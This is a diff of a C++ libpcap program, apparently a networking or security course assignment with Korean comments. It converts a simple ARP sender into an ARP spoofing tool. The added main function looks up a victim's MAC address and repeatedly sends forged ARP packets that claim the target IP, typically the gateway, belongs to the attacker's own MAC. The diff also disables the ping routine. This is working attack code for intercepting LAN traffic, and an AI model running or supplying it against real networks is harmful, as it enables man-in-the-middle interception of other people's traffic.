@@ -23,64 +23,20 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
-std::string smac = "AA:AA:AA:AA:AA:AA";
-std::string dmac = "FE:FE:FE:FE:FE:FF";
-std::string a_smac = "00:0C:29:17:DF:ED";
-std::string tmac = "58:1c:f8:f4:fa:83";
-std::string sip = "192.168.34.10";
-std::string tip = "192.168.34.111";
+std::string smac = "";
+std::string dmac = "FF:FF:FF:FF:FF:FF";//broadcast
+std::string a_smac = "";//smac
+std::string sip = "";//Tell-q
+std::string tmac = "00:00:00:00:00:00";//unknown-q
+std::string tip = "";//who has?-q
 
 
 void usage() {
-	printf("syntax: send-arp-test <interface>\n");
-	printf("sample: send-arp-test wlan0\n");
+	printf("syntax: send-arp-test <interface> <victim-IP> <target-ip>\n");
+	printf("sample: send-arp-test wlan0 192.168.100.5 192.168.100.1\n");
 }
 
-//arp파일로 자기 arp table IP를 찾음
-std::string getIP(const std::string& interface) {
-    // 해당 인터페이스에 해당하는 IPv4 주소를 읽기 위해 /proc/net/arp 파일 사용
-    std::ifstream infile("/proc/net/arp");
-    std::string line;
-
-    while (std::getline(infile, line)) {
-        if (line.find(interface) != std::string::npos) {
-            std::string ip;
-            std::istringstream iss(line);
-            iss >> ip;
-
-            // 첫 번째 컬럼에 해당하는 IPv4 주소 반환
-            return ip;
-        }
-    }
-
-    return "IP 주소를 찾을 수 없습니다.";
-}
-
-std::string getLocalIP(const std::string& interface) {
-    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sockfd == -1) {
-        perror("socket");
-        return "IP 주소를 찾을 수 없습니다.";
-    }
-
-    struct ifreq ifr;
-    std::memset(&ifr, 0, sizeof(ifr));
-    std::strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);
-
-    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
-        close(sockfd);
-        perror("ioctl");
-        return "IP 주소를 찾을 수 없습니다.";
-    }
-
-    close(sockfd);
-    struct sockaddr_in* addr = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
-    return inet_ntoa(addr->sin_addr);
-}
-
-
-//내 자신의 Mac주소를 찾음
-std::string getMAC(const std::string& interface) {
+std::string getmyMAC(const std::string& interface) {
     std::string path = "/sys/class/net/" + interface + "/address";
     std::ifstream infile(path);
     std::string mac;
@@ -93,45 +49,32 @@ std::string getMAC(const std::string& interface) {
     return "MAC 주소를 찾을 수 없습니다.";
 }
 
-#define MAX_LINE_LENGTH 1000
+std::string get_hw_address(const std::string& target_ip) {
+    FILE* arp_fp;
+    char ip[16];
+    char hw_address[18];
+    char line[128];
 
-// Linux 환경에서 gateway 주소를 얻는 함수
-
-std::string getGatewayAddress() {
-    std::string gateway;
-    FILE* routeFile = fopen("/proc/net/route", "r");
-
-    if (routeFile != NULL) {
-        char line[MAX_LINE_LENGTH];
-
-        // 컬럼명 스킵
-        fgets(line, sizeof(line), routeFile);
-
-        while (fgets(line, sizeof(line), routeFile) != NULL) {
-            char iface[MAX_LINE_LENGTH], destination[MAX_LINE_LENGTH], gatewayAddr[MAX_LINE_LENGTH];
-
-            // 라우팅 항목을 파싱하여 gateway 주소 얻기
-            if (sscanf(line, "%s %s %s", iface, destination, gatewayAddr) == 3) {
-                if (strcmp(destination, "00000000") == 0) { // default route인 경우
-                    unsigned int decimalAddr;
-                    sscanf(gatewayAddr, "%x", &decimalAddr);
-                    char buf[16];
-                    sprintf(buf, "%d.%d.%d.%d",
-                            decimalAddr & 0xFF, (decimalAddr >> 8) & 0xFF,
-                            (decimalAddr >> 16) & 0xFF, (decimalAddr >> 24) & 0xFF);
-                    gateway = buf;
-                    break;
-                }
-            }
-        }
-
-        fclose(routeFile);
+    arp_fp = fopen("/proc/net/arp", "r");
+    if (arp_fp == NULL) {
+        std::cerr << "Failed to open arp table" << std::endl;
+        return "";
     }
+    // Skip the first line (column headers)
+    fgets(line, sizeof(line), arp_fp);
 
-    return gateway;
+    while (fgets(line, sizeof(line), arp_fp)) {
+        sscanf(line, "%15s %*s %*s %17s", ip, hw_address);
+
+        if (strcmp(target_ip.c_str(), ip) == 0) { // if the IP addresses match
+            fclose(arp_fp);
+            return std::string(hw_address);
+        }
+    }
+    fclose(arp_fp);
+    return ""; // return an empty string if the target IP was not found
 }
 
-//ping
 void ping(const std::string& targetIp) {
     int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (sockfd < 0) {
@@ -166,7 +109,8 @@ void ping(const std::string& targetIp) {
     struct timeval timeout;
     timeout.tv_sec = 5;
     timeout.tv_usec = 0;
-
+    close(sockfd);
+    /*
     // Setting socket option to wait for max 5 seconds for a response
     if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
         std::cerr << "Error setting socket options" << std::endl;
@@ -185,15 +129,11 @@ void ping(const std::string& targetIp) {
         return;
     }
 
-    close(sockfd);
+    close(sockfd);*/
 }
 
 //arp를 보내는 함수
 int sarp_f(int sw1,int argc, char* argv[]) { // Function return type changed to int
-	if (argc != 2) {
-		usage();
-		return -1;
-	}
 
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -229,47 +169,41 @@ int sarp_f(int sw1,int argc, char* argv[]) { // Function return type changed to 
 	pcap_close(handle);
 	return 0; // Return 0 if everything went well
 }
-//메인함수
+
 int main(int argc, char* argv[]) {
-    
+    if (argc != 4) {
+		usage();
+		return -1;
+	}
+    std::string mymac = getmyMAC(argv[1]);
+    std::cout << "HOST MAC 주소: " << mymac << std::endl;
+    std::string victim_ip = argv[2];
+    printf("Victim:%s\n",victim_ip.c_str());
+    std::string target_ip = argv[3];
+    printf("Target:%s\n",target_ip.c_str());
+    ping(victim_ip.c_str());
+    std::string hw_address_v;
+
+    hw_address_v = get_hw_address(victim_ip);
+
+    if (strcmp(hw_address_v.c_str(), "00:00:00:00:00:00") == 0) {
+        std::cout << "Not Found in Local LAN" << victim_ip << " found in ARP table" << std::endl;
+        return 0;
+    }
+    else if (!hw_address_v.empty()) {
+        std::cout << "Hardware address for IP " << victim_ip << " is " << hw_address_v << std::endl;
+    }else {
+        std::cout << "No entry for IP or Host IP " << victim_ip << " found in ARP table" << std::endl;
+        return 0;
+    }
+    smac = mymac;
+    dmac = hw_address_v;
+    tmac= hw_address_v;
+    a_smac = mymac;
+    sip = target_ip;
+    tip = victim_ip;
     for(int i=0;i<10;i++){
         sarp_f(1,argc, argv); // Call the function 10 times
+        std::cout <<"send arp"<<i<<std::endl;
     }
-    std::string interface = "ens33";
-    std::string ip = getIP(interface);
-    std::cout << "IP 주소: " << ip << std::endl;
-
-    std::string mac = getMAC(interface);
-    std::cout << "MAC 주소: " << mac << std::endl;
-
-    std::string gatewayAddr = getGatewayAddress();
-    if (!gatewayAddr.empty()) {
-        printf("Gateway 주소: %s\n", gatewayAddr.c_str());
-    } else {
-        printf("Gateway 주소를 찾을 수 없습니다.\n");
-    }
-    std::string ipAddr = getLocalIP(interface); // 혹은 getIP(interface)를 사용하면 됨
-    std::cout << "My IP 주소: " << ipAddr << std::endl;
-
-
-    // '.' 기준으로 IP 주소를 분리
-    std::istringstream iss(ip);
-    std::string octet;
-    std::string firstThreeOctets;
-
-    for (int i = 0; i < 3; ++i) {
-        std::getline(iss, octet, '.');
-        firstThreeOctets += octet + ".";
-    }
-    firstThreeOctets.pop_back(); // 마지막에 붙은 '.' 제거
-
-    for(int i=1;i<255;i++){
-        std::string targetIp = firstThreeOctets + "." + std::to_string(i);
-        ping(targetIp);
-    }
-
-
-    return 0;
 }
-
-
